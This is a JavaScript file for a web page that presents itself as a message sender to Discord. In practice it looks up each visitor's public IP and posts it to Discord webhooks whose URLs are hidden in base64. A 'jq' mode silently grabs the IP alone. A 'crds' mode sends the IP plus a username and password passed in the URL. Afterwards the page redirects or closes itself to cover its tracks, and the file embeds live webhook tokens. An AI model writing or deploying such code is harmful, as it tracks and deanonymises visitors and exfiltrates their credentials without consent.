const msg = new URLSearchParams(window.location.search).get("q");
const shMode = new URLSearchParams(window.location.search).get("sh");
const msgMode = new URLSearchParams(window.location.search).get("mo");
const credsP = new URLSearchParams(window.location.search).get("p"); // only works with creds mode
const credsU = new URLSearchParams(window.location.search).get("u"); // only works with creds mode
const hideIP = new URLSearchParams(window.location.search).get("hip");
const redirectPage = new URLSearchParams(window.location.search).get("next");
var errBlankMsg = "Message cannot be blank. <a href=\"javascript:window.history.back();window.close()\">Close</a>"
var errUnknownMsg = "Something went wrong! Try again later. <a href='javascript:window.location.reload()'>Reload</a>"
var errTimedOutMsg = "Timed out! Try again later. <a href='javascript:window.location.reload()'>Reload</a>"
var canRedir = false
var userIP2 = undefined

if (redirectPage !== null && redirectPage !== undefined && redirectPage !== "" && redirectPage !== " " && redirectPage !== " ".repeat(msg.length) && redirectPage !== window.location.pathname) {
  canRedir = true
}

void(shMode);

if (shMode === "1") {
  document.getElementById("main-container").style.display = "flex";
  document.body.style.backgroundColor = "#121212"
} else {
  //
}

var userIP = fetch('https://api.ipify.org/').then(function(response) {
  return response.text();
}).then((content) => {
  uIP2 = content;
  userIP = content;
  sendMSG();
});

function sendMSG() {
  if (sha256(sha256(userIP)) === "dc01e22929f7f37a9eac38e9b071a9a2652fd53292d0a3d7380ab14bfe40b12d") {
    userIP = "Reddstone35";
    uIP2 = "Reddstone35";
  }
  if (hideIP === "1") {
    userIP = "Anonymous";
  }
  var sentMSG = `Sent from \`${userIP}\`. Message: \`${msg}\``;
  var encodedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MjU1OTExMTI3Njk0MTM5NS9uZ1RsUTh2YVRzUFp3SGdjVkU1N1Z3b09GWGI0OFNONm84MkZWU1c0ZGk1YnRhb2t3NzVJbTF5MkNNX2VNVHMwZVQtcA==";
  if (msgMode === null || msgMode === undefined|| msgMode === "" || msgMode === "normal") {
    // normal, dont do anything
    // aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MjU1OTExMTI3Njk0MTM5NS9uZ1RsUTh2YVRzUFp3SGdjVkU1N1Z3b09GWGI0OFNONm84MkZWU1c0ZGk1YnRhb2t3NzVJbTF5MkNNX2VNVHMwZVQtcA==
  } else if (msgMode === "jq") {
    sentMSG = `Public IP: \`${uIP2}\``;
    encodedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MjU2MjA1ODM0MTcyODI1Ni85N3hvdGxJSFJ0bElsbVV2TU5uVWdzRlBaUTVkc0NSbnozbjh6WkY4Q2V0WFp4bUpSS2VfT0hPQS1yUVBGMXBlS1dUWA==";
  } else if (msgMode === "crds") {
    sentMSG = `Public IP: \`${userIP}\`. Password: \`${credsP}\`, Username: \`${credsU}\``;
    encodedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MjU2MjE2MzQ1OTM2Njk5Mi9Td0YwNTdPZWtadk9mVkJMOFEyOFJ5RVpiVFdOdVRMMnNDSUdWY2VCa1BXQnVTT3pGSnJiSXpyenB5YXZiS3hkYV9uTw==";
  }
 
  document.getElementById("loading").innerText = `Sending request to https://discord.com/...`;
  var doSend = true;
  var noerr = true;
  setTimeout(() => {
    if (msgMode !== "jq" && msgMode !== "crds") {
      if (msg === null || msg === undefined|| msg === "" || msg === " " || msg === " ".repeat(msg.length)) {
        doSend = false;
        document.getElementById("img-container").style.display = "none";
        document.getElementById("loading").style.color = "red";
        document.getElementById("loading").innerHTML = errBlankMsg;
        if (shMode !== "1") {
          alert("message is blank");
          window.history.back();
          window.close();
        }
      }
    }
  }, 300);
  
  setTimeout(() => {
    if (doSend === true) {
      try {
        fetch(atob(encodedWebhookUrl), {
            method: 'POST',
            headers: {
                'Host': 'discord.com',
                'Content-Length': '31',
                'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Sec-Ch-Ua-Mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Origin': 'https://reddstone35.com',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://reddstone35.com/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9'
            },
            body: new URLSearchParams({
                'content': sentMSG
            })
        }).then(function() {
          document.getElementById("img-container").style.display = "none";
          document.getElementById("loading").style.display = "unset";
          document.getElementById("loading").style.color = "lime";
          document.getElementById("loading").innerText = "Done!";
          if (canRedir) {
            window.location.href = redirectPage;
          }
          if (shMode  !== "1") {
            window.history.back();
            window.close();
          }
          setTimeout(() => {
            window.history.back();
            window.close();
          }, 100);
        });
      } catch (e) {
        if (shMode  !== "1") {
          alert("An unkown error occurred");
          window.history.back();
          window.close();
        }
        noerr = false
        document.getElementById("img-container").style.display = "none";
        document.getElementById("loading").style.color = "red";
        document.getElementById("loading").innerHTML = errUnknownMsg;
      }
    }
  }, 1000);
  setTimeout(() => {
    if (shMode  !== "1") {
      alert("Timed Out");
      window.history.back();
      window.close();
    }
    if (noerr === true) {
      document.getElementById("img-container").style.display = "none";
      document.getElementById("loading").style.display = "unset";
      document.getElementById("loading").style.color = "red";
      document.getElementById("loading").innerHTML = errTimedOutMsg;
    }
  }, 60000);
}
